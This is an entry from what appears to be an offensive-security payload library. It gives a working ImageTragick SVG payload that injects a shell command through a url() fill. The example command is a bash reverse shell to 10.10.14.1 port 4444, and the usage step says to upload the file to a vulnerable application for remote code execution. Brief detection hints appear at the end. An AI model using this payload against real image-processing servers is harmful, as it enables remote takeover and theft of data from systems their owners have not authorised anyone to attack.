---
id: d0debe4c-f4e2-4999-8d56-187fc15786a4
type: code
language: svg
verified: true
created_at: '2019-11-04T23:05:24.427790+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - imagemagick
  - payload
validated: true
---

# ImageTragick-SVG-Payload-for-RCE

## Code

```svg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://*"|setsid $_PAYLOAD)'
pop graphic-context
```

## Description

SVG snippet exploiting ImageTragick by using URL scheme to pipe command execution via setsid.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_PAYLOAD | Shell command | bash -i >& /dev/tcp/10.10.14.1/4444 0>&1 |

## Usage

Save as .svg, upload to vulnerable app; processed image triggers RCE.

## Detection

- Logs of convert/mogrify with external URLs
- Anomalous setsid or bash from image proc
- File upload monitoring

## Related

- [[procedures/Exploit-ImageMagick-ImageTragick-for-Code-Execution]]
